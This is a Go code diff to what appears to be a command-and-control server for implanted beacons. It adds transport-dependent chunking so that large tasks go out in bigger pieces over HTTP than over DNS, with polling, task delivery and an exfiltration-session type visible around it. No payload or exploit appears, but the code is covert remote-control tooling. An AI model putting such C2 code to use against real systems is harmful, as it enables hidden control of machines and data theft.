@@ -114,7 +114,27 @@ type ChunkedTaskState struct {
 	TaskID      string
 	Command     string
 	TotalChunks int
-	DeliveredAt time.Time
+	// ChunkPayload is how much command text each chunk carried when the delivery
+	// started. Stored per task because it depends on the transport, and a resend
+	// must slice at the same offsets the beacon was given.
+	ChunkPayload int
+	DeliveredAt  time.Time
+}
+
+// httpTaskChunkPayload is the per-message command budget on HTTP.
+//
+// HTTP delivers a whole response body per request, so splitting at the DNS-sized
+// MaxTaskChunkPayload forces a 10 KB command into ~67 round trips for no reason.
+// The cap stays well under a profile's default 1 MiB body even after base36
+// expansion (8 bytes out per 5 in).
+const httpTaskChunkPayload = 60000
+
+// taskChunkPayload returns how much command text one delivery message carries.
+func taskChunkPayload(transport string) int {
+	if strings.EqualFold(strings.TrimSpace(transport), "http") {
+		return httpTaskChunkPayload
+	}
+	return MaxTaskChunkPayload
 }
 
 // ExfilSession tracks per-session metadata for dedicated exfil client uploads
@@ -2050,7 +2070,7 @@ func (a *deliverAction) execute() {
 // When peekOnly is true, signals task-pending without dequeuing (for A-record poll probes).
 // MUST be called with c2.mutex held; unlocks via defer.
 // Callers MUST call action.execute() on the returned deliverAction after this returns.
-func (c2 *C2Manager) deliverNextTask(beacon *Beacon, encrypted bool, peekOnly ...bool) (string, bool, bool, *deliverAction) {
+func (c2 *C2Manager) deliverNextTask(beacon *Beacon, encrypted bool, transport string, peekOnly ...bool) (string, bool, bool, *deliverAction) {
 	defer c2.mutex.Unlock()
 
 	peek := len(peekOnly) > 0 && peekOnly[0]
@@ -2083,18 +2103,20 @@ func (c2 *C2Manager) deliverNextTask(beacon *Beacon, encrypted bool, peekOnly ..
 
 		var taskResponse string
 		var isChunked bool
-		if len(task.Command) > MaxTaskChunkPayload {
-			totalChunks := (len(task.Command) + MaxTaskChunkPayload - 1) / MaxTaskChunkPayload
-			chunk1 := task.Command[:MaxTaskChunkPayload]
+		chunkPayload := taskChunkPayload(transport)
+		if len(task.Command) > chunkPayload {
+			totalChunks := (len(task.Command) + chunkPayload - 1) / chunkPayload
+			chunk1 := task.Command[:chunkPayload]
 			taskResponse = fmt.Sprintf("TASKC|%s|1/%d|%s", task.ID, totalChunks, chunk1)
 			isChunked = true
 
 			ctKey := fmt.Sprintf("%s:%s", beacon.ID, task.ID)
 			c2.chunkedTasks[ctKey] = &ChunkedTaskState{
-				TaskID:      task.ID,
-				Command:     task.Command,
-				TotalChunks: totalChunks,
-				DeliveredAt: time.Now(),
+				TaskID:       task.ID,
+				Command:      task.Command,
+				TotalChunks:  totalChunks,
+				ChunkPayload: chunkPayload,
+				DeliveredAt:  time.Now(),
 			}
 
 			if c2.debug {
@@ -2674,7 +2696,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string, info *C2Q
 
 		// For A-record CHK queries, use peek mode (don't deliver task inline)
 		peekMode := dnsQueryType == 1 && beacon.PhaseConfig != nil && beacon.PhaseConfig.RegQueryType == "A"
-		resp, hasTask, enc, action := c2.deliverNextTask(beacon, encrypted, peekMode)
+		resp, hasTask, enc, action := c2.deliverNextTask(beacon, encrypted, transport, peekMode)
 		action.execute()
 		return resp, hasTask, enc
 
@@ -2780,7 +2802,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string, info *C2Q
 		// For A-record POLL queries, use peek mode — signal task-pending without dequeuing
 		// Client will follow up with a TXT query to retrieve the actual task
 		peekMode := dnsQueryType == 1 && beacon.PhaseConfig != nil && beacon.PhaseConfig.PollQueryType == "A"
-		resp, hasTask, enc, action := c2.deliverNextTask(beacon, encrypted, peekMode)
+		resp, hasTask, enc, action := c2.deliverNextTask(beacon, encrypted, transport, peekMode)
 		action.execute()
 		return resp, hasTask, enc
 
@@ -2804,10 +2826,11 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string, info *C2Q
 			if task, tExists := c2.tasks[taskID]; tExists && len(task.Command) > MaxTaskChunkPayload {
 				totalChunks := (len(task.Command) + MaxTaskChunkPayload - 1) / MaxTaskChunkPayload
 				state = &ChunkedTaskState{
-					TaskID:      taskID,
-					Command:     task.Command,
-					TotalChunks: totalChunks,
-					DeliveredAt: time.Now(),
+					TaskID:       taskID,
+					Command:      task.Command,
+					TotalChunks:  totalChunks,
+					ChunkPayload: MaxTaskChunkPayload,
+					DeliveredAt:  time.Now(),
 				}
 				c2.chunkedTasks[ctKey] = state
 				found = true
@@ -2823,8 +2846,12 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string, info *C2Q
 			return "ACK", true, encrypted
 		}
 
-		start := (chunkIndex - 1) * MaxTaskChunkPayload
-		end := start + MaxTaskChunkPayload
+		payload := state.ChunkPayload
+		if payload <= 0 {
+			payload = MaxTaskChunkPayload
+		}
+		start := (chunkIndex - 1) * payload
+		end := start + payload
 		if end > len(state.Command) {
 			end = len(state.Command)
 		}
